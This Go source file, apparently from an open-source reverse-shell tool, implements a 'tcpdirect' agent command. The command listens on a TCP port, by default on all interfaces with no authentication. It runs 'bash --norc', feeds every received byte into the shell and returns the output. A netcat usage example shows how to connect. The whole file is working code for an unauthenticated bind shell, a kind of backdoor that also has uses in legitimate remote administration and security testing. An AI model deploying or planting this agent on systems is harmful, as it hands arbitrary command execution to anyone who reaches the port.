package cmd

import (
	"bufio"
	"fmt"
	"net"
	"time"

	"github.com/golang/glog"
	"github.com/maxlaverse/reverse-shell/agents/go/handler"
	"github.com/spf13/cobra"
)

const (
	tcpDirectListenerExample = `You can connect to it using netcat:
# On the agent (1.2.3.4)
$ reverse-shell-agent tcpdirect --port 7777

# On the master
$ nc 1.2.3.4 7777
`
)

type tcpdirectListenerOptions struct {
	host string
	port int32
}

// NewTCPdirectListenerCommand creates a new cobra.Command for `agent tcpdirect`
func NewTCPdirectListenerCommand(agent Cli) *cobra.Command {
	var opts tcpdirectListenerOptions

	cmd := &cobra.Command{
		Use:              "tcpdirect",
		Short:            "Agent that listens for commands on a local port",
		Example:          tcpDirectListenerExample,
		TraverseChildren: true,
		Run: func(cmd *cobra.Command, args []string) {
			agent.SafeStart(newTCPDirectListener(opts.host, opts.port))
		},
	}

	cmd.Flags().StringVarP(&opts.host, "host", "", "0.0.0.0", "local address to listen to")
	cmd.Flags().Int32VarP(&opts.port, "port", "", 8080, "local port to listen to")

	return cmd
}

type tcpdirectListener struct {
	processOutput     chan *handler.ProcessOutput
	processTerminated chan *handler.ProcessTerminated
	input             chan []byte
	readerClosed      chan struct{}
	connectionLost    chan struct{}
	address           string
	handler           *handler.Handler
	ln                net.Listener
}

func newTCPDirectListener(host string, port int32) *tcpdirectListener {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &tcpdirectListener{
		processOutput:     processOutput,
		processTerminated: processTerminated,
		input:             make(chan []byte),
		readerClosed:      make(chan struct{}),
		connectionLost:    make(chan struct{}),
		address:           fmt.Sprintf("%s:%d", host, port),
		handler:           handler.NewHandler(processOutput, processTerminated),
	}
}

func (l *tcpdirectListener) Start() error {
	ln, err := net.Listen("tcp", l.address)
	if err != nil {
		return err
	}

	l.ln = ln
	return nil
}

func (l *tcpdirectListener) Addr() net.Addr {
	return l.ln.Addr()
}

func (l *tcpdirectListener) Listen() error {
	glog.V(2).Infof("Ready for a new connection")
	conn, _ := l.ln.Accept()
	go l.pipeFromProcessOutput(conn)
	go l.pipeToProcessInput(conn)

	processID := l.handler.CreateProcess("bash --norc")

	for {
		select {
		case msg := <-l.input:
			l.handler.ExecuteCommand(processID, msg)
		case <-l.readerClosed:
			glog.V(2).Infof("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			glog.V(2).Infof("Main Loop stopped")
			return fmt.Errorf("Lost connection")
		}
	}
}

func (l *tcpdirectListener) pipeToProcessInput(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		glog.V(2).Infof("SetReadDeadline failed: %v", err)
		l.readerClosed <- struct{}{}
		conn.Close()
		return
	}

	for {
		recvBuf := make([]byte, 1024)
		size, err := bufio.NewReader(conn).Read(recvBuf)
		if err != nil {
			glog.V(2).Infof("Error while reading data from tcp connection: %s", err)
			l.readerClosed <- struct{}{}
			conn.Close()
			break
		}
		l.input <- recvBuf[0:size]
	}
}

func (l *tcpdirectListener) pipeFromProcessOutput(conn net.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			glog.V(2).Infof("Received %d bytes from processOutput for '%s'", len(a.Result), a.Process.Name)
			conn.Write([]byte(a.Result))

		case <-l.processTerminated:
			glog.V(2).Infof("Received a processTerminated signal! Closing connection")
			conn.Write([]byte("Process terminated\n"))
			conn.Close()

		case <-l.connectionLost:
			glog.V(2).Infof("Received a connectionLost signal! Stopping the loop")
			break PipeLoop
		}
	}
}
